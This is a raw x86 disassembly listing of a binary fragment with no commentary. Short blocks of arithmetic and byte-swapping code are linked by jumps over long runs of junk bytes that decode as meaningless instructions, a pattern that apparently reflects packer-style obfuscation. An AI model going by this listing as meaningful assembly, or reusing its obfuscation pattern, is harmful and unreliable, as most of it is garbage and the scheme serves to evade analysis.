  40850d:	pop    ebp
  40850e:	mov    esi,0xfd130b98
  408513:	push   DWORD PTR es:[edi-0x455709b2]
  40851a:	jmp    0x7f5da040
  40851f:	data16 jbe 0x4084e4
  408522:	dec    esp
  408523:	scas   eax,DWORD PTR es:[edi]
  408524:	xor    cl,ch
  408526:	push   eax
  408527:	sub    dh,dl
  408529:	stos   DWORD PTR es:[edi],eax
  40852a:	adc    al,0xaa
  40852c:	adc    DWORD PTR [eax+0x1a],esi
  40852f:	in     eax,dx
  408530:	mov    ebp,0x167fec
  408535:	mov    esi,0x40817b77
  40853a:	dec    ebx
  40853b:	sbb    eax,ebp
  40853d:	call   0x4816aa2d
  408542:	jbe    0x408521
  408544:	xchg   BYTE PTR [eax+0xa],dh
  408547:	test   BYTE PTR [esi],0x0
  40854a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40854b:	(bad)  
  40854d:	mov    gs,WORD PTR [edx]
  40854f:	mov    dh,BYTE PTR [edx-0x1a]
  408552:	adc    BYTE PTR [ebp-0x29],bl
  408555:	int3   
  408556:	stos   DWORD PTR es:[edi],eax
  408557:	sub    DWORD PTR ds:0x54644311,esp
  40855d:	sub    edx,edi
  40855f:	xor    edi,DWORD PTR [ebx-0x4c9857cb]
  408565:	sbb    al,0x69
  408567:	aaa    
  408568:	cmp    DWORD PTR [ebp-0x250687a7],ebx
  40856e:	mov    ch,0x3e
  408570:	xlat   BYTE PTR ds:[ebx]
  408571:	dec    eax
  408572:	dec    esp
  408573:	test   al,0xf7
  408575:	inc    esi
  408576:	cmp    eax,0xd79aaf3a
  40857b:	cmp    bl,dh
  40857d:	sub    DWORD PTR [esi-0x2d],eax
  408580:	repnz sub BYTE PTR [edx],cl
  408583:	cmc    
  408584:	imul   ecx,DWORD PTR [ecx],0xfffffffb
  408587:	mov    esi,0x870fda3b
  40858c:	or     BYTE PTR [eax],al
  40858e:	add    BYTE PTR [eax],al
  408590:	mov    edx,DWORD PTR [ebp-0x34]
  408593:	jmp    0x408770
  408598:	mov    edx,DWORD PTR [ebp-0x3c]
  40859b:	mov    edi,DWORD PTR [ebp-0x4]
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x9e42353f
  4085c4:	jno    0x4085ce
  4085c6:	loope  0x40859f
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x408588
  4085cf:	ja     0x408622
  4085d1:	inc    esi
  4085d2:	in     al,dx
  4085d3:	xchg   edx,eax
  4085d4:	jns    0x40857b
  4085d6:	lahf   
  4085d7:	mov    esp,0xc473bf3f
  4085dc:	out    dx,al
  4085dd:	mov    al,ds:0x2492aa97
  4085e2:	les    edi,FWORD PTR [edx-0x529d24f5]
  4085e8:	imul   ecx,DWORD PTR [esi-0x3f],0xffffffa6
  4085ec:	pop    edi
  4085ed:	sub    BYTE PTR [ebp-0x568f76bc],bh
  4085f3:	pop    ecx
  4085f4:	lods   eax,DWORD PTR ds:[esi]
  4085f5:	out    dx,eax
  4085f6:	inc    eax
  4085f7:	xchg   BYTE PTR gs:[edi-0x7d21f35f],al
  4085fe:	test   BYTE PTR [esp+ebx*4-0x6a7cc337],ah
  408605:	adc    bh,dh
  408607:	inc    esi
  408608:	adc    al,0x60
  40860a:	adc    eax,0x9bcfd9cc
  40860f:	adc    BYTE PTR ds:0x7b442b56,dl
  408615:	fstp   DWORD PTR [esi+0x5a1dd696]
  40861b:	js     0x408668
  40861d:	outs   dx,BYTE PTR ds:[esi]
  40861e:	and    al,0x7c
  408620:	cmp    edi,DWORD PTR ds:0xa9347dba
  408626:	je     0x40862c
  408628:	in     al,dx
  408629:	bound  eax,QWORD PTR [ecx]
  40862b:	sub    bh,BYTE PTR [edx]
  40862d:	in     eax,0xd8
  40862f:	xchg   esp,eax
  408630:	sub    esp,DWORD PTR [ebp-0x80]
  408633:	test   BYTE PTR [ecx],al
  408635:	inc    eax
  408636:	sahf   
  408637:	loope  0x40869b
  408639:	mov    ds:0xc2ef764,eax
  40863e:	inc    edi
  40863f:	jnp    0x4085c5
  408641:	fdivr  DWORD PTR ss:[ecx]
  408644:	lods   al,BYTE PTR ds:[esi]
  408645:	inc    esi
  408646:	mov    eax,0xca168e54
  40864b:	mov    al,ds:0x80ac3ec0
  408650:	and    eax,DWORD PTR [edx-0x67]
  408653:	aad    0x3b
  408655:	push   0xf06cc9a9
  40865a:	pop    ecx
  40865b:	mov    bh,0x6e
  40865d:	mov    edi,0x9fe96d6f
  408662:	test   esp,ebx
  408664:	cmp    ah,BYTE PTR [esi+0x15]
  408667:	add    DWORD PTR [esi],esi
  408669:	jo     0x4085ee
  40866b:	mov    gs,WORD PTR [ebp+edi*2-0x3c]
  40866f:	adc    DWORD PTR [ecx-0x2aedbb0d],eax
  408675:	mov    dl,0x59
  408677:	lahf   
  408678:	outs   dx,DWORD PTR ds:[esi]
  408679:	dec    ebp
  40867a:	mov    ds:0x1dd6e7c6,eax
  40867f:	mov    eax,ds:0x6e6666b3
  408684:	fldcw  WORD PTR [ecx-0x47]
  408687:	jmp    0x4086bc
  408689:	std    
  40868a:	aad    0x43
  40868c:	rol    BYTE PTR [ebx-0x60],1
  40868f:	dec    edi
  408690:	xor    bh,BYTE PTR [edi-0x58010d68]
  408696:	das    
  408697:	rol    DWORD PTR [ebp-0x2e],1
  40869a:	xor    DWORD PTR [esi],esi
  40869c:	pop    ebp
  40869d:	xchg   DWORD PTR [ecx],ecx
  40869f:	add    al,0x61
  4086a1:	sbb    DWORD PTR [ebx],edi
  4086a3:	mov    dh,0x10
  4086a5:	mov    edi,0x9719f42f
  4086aa:	xor    BYTE PTR [ebx-0x68af9c86],ah
  4086b0:	in     eax,0x16
  4086b2:	std    
  4086b3:	and    BYTE PTR [ecx+0x4d],bl
  4086b6:	mov    ah,0xfe
  4086b8:	rcl    BYTE PTR [eax+0x6e55e070],0x9f
  4086bf:	or     ebx,0x1483be1b
  4086c5:	aaa    
  4086c6:	xchg   esi,eax
  4086c7:	pop    edx
  4086c8:	jbe    0x40865a
  4086ca:	xchg   edi,eax
  4086cb:	sbb    al,0x4f
  4086cd:	es sub eax,0x2d5cf633
  4086d3:	sub    cl,BYTE PTR [edi]
  4086d5:	or     bl,cl
  4086d7:	mov    esi,0x71cacf24
  4086dc:	pop    eax
  4086dd:	outs   dx,DWORD PTR ds:[esi]
  4086de:	scas   al,BYTE PTR es:[edi]
  4086df:	or     ah,BYTE PTR [edx]
  4086e1:	arpl   sp,ax
  4086e3:	pop    ss
  4086e4:	adc    bh,BYTE PTR [ebx+0xd]
  4086e7:	mov    bl,0x28
  4086e9:	enter  0x3303,0xf3
  4086ed:	loope  0x40871c
  4086ef:	xchg   esp,eax
  4086f0:	call   0x897f:0x3d7e1371
  4086f7:	(bad)  
  4086f8:	js     0x4086d4
  4086fa:	cmc    
  4086fb:	xlat   BYTE PTR ds:[ebx]
  4086fc:	or     esp,DWORD PTR [ecx-0x4e]
  4086ff:	scas   al,BYTE PTR es:[edi]
  408700:	pop    edi
  408701:	aas    
  408702:	jle    0x4086f8
  408704:	fcom   QWORD PTR [ecx+0x2236214c]
  40870a:	(bad)  
  40870b:	out    dx,al
  40870c:	shl    BYTE PTR [ecx-0x5b],1
  40870f:	push   edi
  408710:	dec    edx
  408711:	test   DWORD PTR [esp+ecx*4-0x3d],esi
  408715:	ror    BYTE PTR [esp+edx*8],cl
  408718:	adc    al,0xc2
  40871a:	je     0x408766
  40871c:	sub    BYTE PTR [ebp+ecx*4-0x62],ah
  408720:	pop    edi
  408721:	inc    esp
  408722:	push   ds
  408723:	cli    
  408724:	scas   al,BYTE PTR es:[edi]
  408725:	push   0xb4820969
  40872a:	cmp    dh,BYTE PTR [edx]
  40872c:	add    ah,dl
  40872e:	cld    
  40872f:	mov    BYTE PTR [ebp-0x7e7ca90e],bl
  408735:	or     ah,cl
  408737:	aam    0x37
  408739:	dec    ecx
  40873a:	pushf  
  40873b:	and    ebp,DWORD PTR [esi+0x2f6a6251]
  408741:	xchg   DWORD PTR [eax-0x7e],ebx
  408744:	inc    ecx
  408745:	inc    ebp
  408746:	(bad)  
  408747:	push   ecx
  408748:	int    0x19
  40874a:	jbe    0x40878f
  40874c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40874d:	xor    eax,0x4c4100e4
  408752:	popa   
  408753:	or     BYTE PTR [ebp-0x60],dh
  408756:	fwait
  408757:	add    eax,0x4ca282c2
  40875c:	inc    eax
  40875d:	out    0xfa,eax
  40875f:	cs mov ah,0xb1
  408762:	cmp    ebx,edx
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	pop    ss
  408848:	dec    ebp
  408849:	cmp    BYTE PTR [edx],ch
  40884b:	jge    0x408822
  40884d:	jle    0x4088cd
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x40884c
  408854:	jb     0x4087dd
  408856:	(bad)  
  408857:	aas    
  408858:	(bad)
  40885c:	mov    BYTE PTR [ecx-0x6a9e729e],dh
  408862:	pop    esi
  408863:	mov    dh,0x2e
  408865:	xor    eax,0x2296c35
  40886a:	mov    bh,0xc1
  40886c:	imul   eax,DWORD PTR ds:0x4357dafe,0x76
  408873:	sub    al,BYTE PTR [esi-0x67]
  408876:	push   eax
  408877:	inc    edi
  408878:	inc    edi
  408879:	sub    ah,BYTE PTR [ecx-0x71eb92ec]
  40887f:	out    0x5d,eax
  408881:	cs call 0x6726d17c
  408887:	cs ret 0x7cc
  40888b:	xor    al,ch
  40888d:	xlat   BYTE PTR ds:[ebx]
  40888e:	xchg   edx,eax
  40888f:	push   0xbb3374e2
  408894:	and    DWORD PTR [ebx],0x8
  408897:	mov    esp,esi
  408899:	dec    ebx
  40889a:	(bad)  
  40889b:	je     0x408859
  40889d:	jecxz  0x408837
  40889f:	cmp    eax,0x1144c320
  4088a4:	ficomp WORD PTR [edx-0x4b452dc1]
  4088aa:	ins    BYTE PTR es:[edi],dx
  4088ab:	aam    0xb
  4088ad:	dec    eax
  4088ae:	inc    ebx
  4088af:	push   edi
  4088b0:	push   ebx
  4088b1:	stc    
  4088b2:	xchg   edi,eax
  4088b3:	jo     0x4088a9
  4088b5:	jbe    0x4088fc
  4088b7:	in     al,dx
  4088b8:	rol    DWORD PTR [ebx+eax*8-0x2f],cl
  4088bc:	xchg   BYTE PTR [edi],cl
  4088be:	and    DWORD PTR [ebx-0x47a6f8bf],edi
  4088c4:	into   
  4088c5:	mov    dl,0xe0
  4088c7:	(bad)  
  4088c8:	aam    0x20
  4088ca:	dec    edi
  4088cb:	cdq    
  4088cc:	jnp    0x408896
  4088ce:	mov    ss,ebp
  4088d0:	pop    edx
  4088d1:	sbb    eax,0x9f299337
  4088d6:	(bad)  
  4088d7:	sub    eax,0xd0cdc763
  4088dc:	add    eax,0x5836565
  4088e1:	mov    bh,0x25
  4088e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e4:	fst    DWORD PTR [ecx+ebx*8]
  4088e7:	mov    eax,0x9687a7d1
  4088ec:	ja     0x408900
  4088ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088f0:	or     esp,DWORD PTR [eax-0x56]
  4088f3:	jns    0x4088aa
  4088f5:	sub    DWORD PTR [edx-0x177962f7],ebp
  4088fb:	jp     0x4088d7
  4088fd:	test   DWORD PTR [eax],ecx
  4088ff:	sub    ah,dh
  408901:	std    
  408902:	hlt    
  408903:	and    dl,BYTE PTR [eax+eax*2-0x34]
  408907:	or     ebx,ebx
  408909:	pop    eax
  40890a:	jbe    0x40895e
  40890c:	jo     0x408947
  40890e:	jl     0x4088c6
  408910:	pop    esi
  408911:	sti    
  408912:	repnz dec eax
  408914:	xchg   ebx,eax
  408915:	fcmove st,st(1)
  408917:	ja     0x4088cf
  408919:	(bad)  
  40891a:	scas   eax,DWORD PTR es:[edi]
  40891b:	stos   BYTE PTR es:[edi],al
  40891c:	sbb    BYTE PTR [edi],0xa9
  40891f:	jecxz  0x408987
  408921:	mov    esp,0xa714062e
  408926:	out    0xd1,al
  408928:	jle    0x4088cc
  40892a:	cmp    DWORD PTR [eax+0x5b],0xffffffdc
  40892e:	inc    ecx
  40892f:	es pop edi
  408931:	xor    dh,BYTE PTR [eax-0x6b3c9c3a]
  408937:	clc    
  408938:	sub    al,0x3e
  40893a:	pminsw mm0,QWORD PTR [ebp+eiz*2-0x50]
  40893f:	ret    
  408940:	sbb    ebx,DWORD PTR [ebp-0x2a]
  408943:	push   ebp
  408944:	mov    ebx,0xb4d62f17
  408949:	jmp    0x408953
  40894b:	inc    edx
  40894c:	fnstcw WORD PTR [eax]
  40894e:	je     0x4088f1
  408950:	jl     0x408994
  408952:	jo     0x40893b
  408954:	clc    
  408955:	xchg   esi,eax
  408956:	push   ebp
  408957:	inc    edx
  408958:	sub    ah,dh
  40895a:	pop    es
  40895b:	lods   eax,DWORD PTR ss:[esi]
  40895d:	pop    edx
  40895e:	shr    edx,0x7a
  408961:	sub    dl,BYTE PTR [esi-0x6d]
  408964:	mov    ecx,0xadde2c5
  408969:	pop    DWORD PTR [ecx]
  40896b:	lahf   
  40896c:	mov    bl,0x2c
  40896e:	lds    edx,FWORD PTR [ebx]
  408970:	fcomip st,st(1)
  408972:	fsub   st,st(1)
  408974:	(bad)  
  408975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408976:	mov    ds:0xc8d4d0a5,al
  40897b:	sahf   
  40897c:	cmp    bh,ch
  40897e:	arpl   WORD PTR [ebx+esi*4-0x69],si
  408982:	push   ss
  408983:	pop    eax
  408984:	push   0x17933641
  408989:	in     eax,dx
  40898a:	xlat   BYTE PTR ds:[ebx]
  40898b:	fistp  QWORD PTR [eax]
  40898d:	out    dx,al
  40898e:	test   eax,0x9086916c
  408993:	push   edi
  408994:	shr    ah,cl
  408996:	sub    al,0x3f
  408998:	ret    
  408999:	test   BYTE PTR [ebp+0x64],ah
  40899c:	(bad)  
  40899d:	fcomip st,st(3)
  40899f:	retf   0x6164
  4089a2:	dec    esp
  4089a3:	add    ebx,DWORD PTR [edx-0x29]
  4089a6:	cmp    BYTE PTR [eax-0x22],0x45
  4089aa:	sbb    DWORD PTR [ecx-0x64],esi
  4089ad:	cmc    
  4089ae:	jo     0x4089f9
  4089b0:	clc    
  4089b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089b2:	mov    eax,ds:0x7a34591e
  4089b7:	cwde   
  4089b8:	test   al,0xc
  4089ba:	cmp    ch,BYTE PTR [ebp+0x67]
  4089bd:	xchg   ebp,eax
  4089be:	pop    esi
  4089bf:	scas   eax,DWORD PTR es:[edi]
  4089c0:	popa   
  4089c1:	repz pop edx
  4089c3:	mov    WORD PTR [edi-0x13891aea],gs
  4089c9:	inc    eax
  4089ca:	ret    
  4089cb:	jle    0x408a0b
  4089cd:	call   0xfb69:0xe067006a
  4089d4:	xor    al,0x8d
  4089d6:	push   esp
  4089d7:	pushf  
  4089d8:	add    eax,0xede35690
  4089dd:	scas   al,BYTE PTR es:[edi]
  4089de:	mov    DWORD PTR [edi+0x50],esi
  4089e1:	imul   esp,DWORD PTR [edi],0xffffffb2
  4089e4:	sub    BYTE PTR [esi-0x3f],ah
  4089e7:	xor    edi,eax
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	xor    bl,BYTE PTR [edi+0x45]
  408a09:	inc    esi
  408a0a:	mov    edx,edx
  408a0c:	jle    0x408a8c
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x408a2b
  408a13:	cs loop 0x408a30
  408a16:	(bad)  
  408a17:	leave  
  408a18:	xchg   edi,eax
  408a19:	call   0x56f3:0xe056f095
  408a20:	out    dx,al
  408a21:	sbb    cl,ah
  408a23:	and    edx,DWORD PTR [ebp+0x6e096016]
  408a29:	xor    esi,ebx
  408a2b:	inc    ecx
  408a2c:	sar    BYTE PTR ds:0x4f74e77c,0xa4
  408a33:	sub    eax,0x68df0c2b
  408a38:	jb     0x408a09
  408a3a:	mov    ecx,0x38771866
  408a3f:	clc    
  408a40:	mov    edx,edi
  408a42:	push   es
  408a43:	push   ebp
  408a44:	scas   al,BYTE PTR es:[edi]
  408a45:	cld    
  408a46:	jg     0x408aa0
  408a48:	jp     0x408a75
  408a4a:	xchg   BYTE PTR [ebx],cl
  408a4c:	mov    ah,0x3f
  408a4e:	mov    cl,0x44
  408a50:	fcomp  QWORD PTR [edx+0x78]
  408a53:	fstp   DWORD PTR [esi+0x9249165]
  408a59:	arpl   WORD PTR fs:[edi+0x2ffadefa],si
  408a60:	push   edi
  408a61:	cmp    esi,ecx
  408a63:	shl    edi,cl
  408a65:	adc    dl,cl
  408a67:	popf   
  408a68:	loopne 0x408abb
  408a6a:	stc    
  408a6b:	(bad)  
  408a6c:	mov    al,ds:0x9e23ad82
  408a71:	lea    eax,[ebx+0x72]
  408a74:	sbb    cl,BYTE PTR [eax]
  408a76:	imul   edi,DWORD PTR [esi+0x0],0xcac907b1
  408a7d:	sbb    ebp,DWORD PTR [edi+0x5d260e7b]
  408a83:	test   ah,ch
  408a85:	stos   DWORD PTR es:[edi],eax
  408a86:	aam    0x9
  408a88:	icebp  
  408a89:	or     edx,ebx
  408a8b:	adc    DWORD PTR [edi+0x2d503067],ebx
  408a91:	mov    al,ds:0x850cbf03
  408a96:	rcl    BYTE PTR [esi+esi*1+0x31],0xb9
  408a9b:	loope  0x408b15
  408a9d:	(bad)  
  408a9e:	pop    esp
  408a9f:	cmp    al,0x8d
  408aa1:	adc    DWORD PTR [ebx],edx
  408aa3:	das    
  408aa4:	fld    QWORD PTR [ebx-0x4b]
  408aa7:	or     BYTE PTR [ebx-0x60],bh
  408aaa:	and    dl,BYTE PTR ds:0x380e0078
  408ab0:	push   0x47
  408ab2:	test   BYTE PTR [edx-0x69],al
  408ab5:	lea    esi,[ecx+ebx*4]
  408ab8:	mov    esi,0x43cdacc4
  408abd:	pushf  
  408abe:	int3   
  408abf:	fild   WORD PTR [ecx+esi*4-0x3f3c0e51]
  408ac6:	mov    ch,0x33
  408ac8:	pop    ss
  408ac9:	mov    ebx,0x10a97c14
  408ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408acf:	push   es
  408ad0:	shr    eax,0x70
  408ad3:	daa    
  408ad4:	es add esp,ebp
  408ad7:	push   cs
  408ad8:	inc    edi
  408ad9:	dec    ebx
  408ada:	shl    DWORD PTR [eax],0x81
  408add:	mov    bh,0x3a
  408adf:	jg     0x408b0f
  408ae1:	sbb    eax,0x8db24279
  408ae6:	daa    
  408ae7:	ss or  cl,dh
  408aea:	popf   
  408aeb:	inc    esp
  408aec:	sub    al,0x8b
  408aee:	sbb    al,0x7b
  408af0:	rcl    DWORD PTR [ebx],cl
  408af2:	pusha  
  408af3:	dec    eax
  408af4:	stos   DWORD PTR es:[edi],eax
  408af5:	test   BYTE PTR [eax+0x77f3a569],bh
  408afb:	shl    BYTE PTR [ecx-0x8],1
  408afe:	dec    ebx
  408aff:	mov    cl,0x3a
  408b01:	push   edx
  408b02:	mov    edx,ecx
  408b04:	adc    al,0xd9
  408b06:	pushw  0x162c
  408b0a:	sub    bh,BYTE PTR [eax]
  408b0c:	scas   al,BYTE PTR es:[edi]
  408b0d:	mov    edi,DWORD PTR [ecx+eiz*2]
  408b10:	inc    esi
  408b11:	push   edx
  408b12:	jp     0x408ac3
  408b14:	(bad)  
  408b15:	sub    BYTE PTR [ecx+ebx*2+0x7db34bb7],bh
  408b1c:	pop    ds
  408b1d:	test   DWORD PTR [edx+0x161974ea],ebp
  408b23:	mov    ah,0xd5
  408b25:	mov    esi,0x8eb1be45
  408b2a:	out    dx,al
  408b2b:	mov    ebp,0xd1b26cad
  408b30:	sbb    dl,ah
  408b32:	cs pusha 
  408b34:	push   cs
  408b35:	jmp    0x408b4e
  408b37:	imul   ebx,DWORD PTR [edi-0x583e70aa],0x94f2093e
  408b41:	dec    esi
  408b42:	jp     0x408b42
  408b44:	pusha  
  408b45:	dec    edi
  408b46:	add    esi,eax
  408b48:	inc    esp
  408b49:	mov    esp,0xc9391986
  408b4e:	add    eax,0x343c0b0d
  408b53:	in     eax,0x6
  408b55:	mov    DWORD PTR [edx+0xa],edx
  408b58:	pop    ebx
  408b59:	mov    al,0x7b
  408b5b:	arpl   WORD PTR [edi],si
  408b5d:	stos   DWORD PTR es:[edi],eax
  408b5e:	or     cl,BYTE PTR [ecx-0x3df5889a]
  408b64:	pop    edx
  408b65:	(bad)  
  408b66:	in     al,dx
  408b67:	ss push cs
  408b69:	scas   eax,DWORD PTR es:[edi]
  408b6a:	push   eax
  408b6b:	call   0x3f4f:0x19341f03
  408b72:	div    BYTE PTR [edi]
  408b74:	(bad)  
  408b75:	sub    al,0x6e
  408b77:	out    dx,al
  408b78:	push   ecx
  408b79:	adc    edx,DWORD PTR [ebx+ebx*1+0x65]
  408b7d:	bound  esp,QWORD PTR [edx-0x44]
  408b80:	shl    WORD PTR ss:[esi+0x61],1
  408b85:	lods   al,BYTE PTR ds:[esi]
  408b86:	xchg   esp,eax
  408b87:	mov    ah,0xc4
  408b89:	enter  0xdc84,0x72
  408b8d:	cmp    ebp,DWORD PTR [edx-0x113de2c7]
  408b93:	xchg   ebx,eax
  408b94:	test   BYTE PTR [ebx+0xe],dh
  408b97:	cmp    al,0x1b
  408b99:	xchg   edx,eax
  408b9a:	jg     0x408b8b
  408b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b9d:	out    0x86,al
  408b9f:	xlat   BYTE PTR ds:[ebx]
  408ba0:	fistp  WORD PTR [ebx]
  408ba2:	push   edx
  408ba3:	cli    
  408ba4:	push   DWORD PTR [ebp+ecx*4-0x44]
  408ba8:	pop    ds
  408ba9:	fwait
  408baa:	jb     0x408bde
  408bac:	add    BYTE PTR [ebx],bh
  408bae:	cli    
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	lahf   
  408bd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bda:	les    ebx,FWORD PTR ds:0x7e7ed025
  408be0:	mov    bh,BYTE PTR [edi+0x7e]
  408be3:	jle    0x408b8b
  408be5:	jmp    0x408c06
  408be7:	test   DWORD PTR [ebx+0x75],ebx
  408bea:	bound  esp,QWORD PTR [edi-0x3cdba160]
  408bf0:	dec    esp
  408bf1:	dec    eax
  408bf2:	aad    0x50
  408bf4:	mov    eax,ds:0x7015daab
  408bf9:	sub    al,0xd9
  408bfb:	sbb    edi,DWORD PTR [ecx+0x12799c0f]
  408c01:	sti    
  408c02:	out    0x6a,eax
  408c04:	dec    esi
  408c05:	xor    eax,0x86c7f110
  408c0a:	rcr    eax,1
  408c0c:	jne    0x408c7c
  408c0e:	sub    al,0x5f
  408c10:	test   DWORD PTR [esi+0x7c],eax
  408c13:	lds    ecx,FWORD PTR [edi-0x38]
  408c16:	pusha  
  408c17:	jbe    0x408bea
  408c19:	(bad)  
  408c1a:	xchg   esp,eax
  408c1b:	inc    ebp
  408c1c:	push   es
  408c1d:	div    BYTE PTR [edi-0x7d64bad1]
  408c23:	cdq    
  408c24:	repz loope 0x408c7d
  408c27:	fsub   QWORD PTR [esi-0x6dc930e3]
  408c2d:	rol    ebx,cl
  408c2f:	clc    
  408c30:	jl     0x408bdf
  408c32:	mov    eax,ds:0x97375b68
  408c37:	(bad)  
  408c38:	lods   eax,DWORD PTR ds:[esi]
  408c39:	and    DWORD PTR [edx+0x74c94b36],esp
  408c3f:	jmp    0x4dca:0x501835c
  408c46:	loope  0x408be9
  408c48:	adc    edi,edi
  408c4a:	adc    ebx,ebx
  408c4c:	xchg   BYTE PTR [ecx],bl
  408c4e:	std    
  408c4f:	mov    bl,0xf3
  408c51:	dec    esp
  408c52:	test   al,0x5b
  408c54:	xchg   esp,eax
  408c55:	hlt    
  408c56:	mov    esp,0xef6ae4a5
  408c5b:	push   esi
  408c5c:	xor    ah,BYTE PTR [ecx+edx*2-0x6]
  408c60:	push   esi
  408c61:	and    ecx,DWORD PTR [esi]
  408c63:	jne    0x408c83
  408c65:	sub    al,0x70
  408c67:	push   ecx
  408c68:	mov    ecx,0x16a53874
  408c6d:	fstp   DWORD PTR [ebx]
  408c6f:	jmp    0x341:0x6ed9708a
  408c76:	stc    
  408c77:	fidivr WORD PTR [ebx+0x57]
  408c7a:	mov    ah,0x75
  408c7c:	inc    esi
  408c7d:	xchg   ebp,eax
  408c7e:	pusha  
  408c7f:	pop    ebp
  408c80:	jbe    0x408cc1
  408c82:	xor    eax,0xbd0555c9
  408c87:	dec    esi
  408c88:	pop    ebx
  408c89:	sub    al,0xe6
  408c8b:	cmp    eax,0x6b93b398
  408c90:	lods   al,BYTE PTR ds:[esi]
  408c91:	scas   al,BYTE PTR es:[edi]
  408c92:	and    al,0xae
  408c94:	not    ecx
  408c96:	(bad)  
  408c97:	leave  
  408c98:	xchg   BYTE PTR [ebx-0x5c],cl
  408c9b:	iret   
  408c9c:	cmp    bl,cl
  408c9e:	(bad)  
  408c9f:	jmp    FWORD PTR [esi]
  408ca1:	or     DWORD PTR [ecx+0x15c4c49],ebp
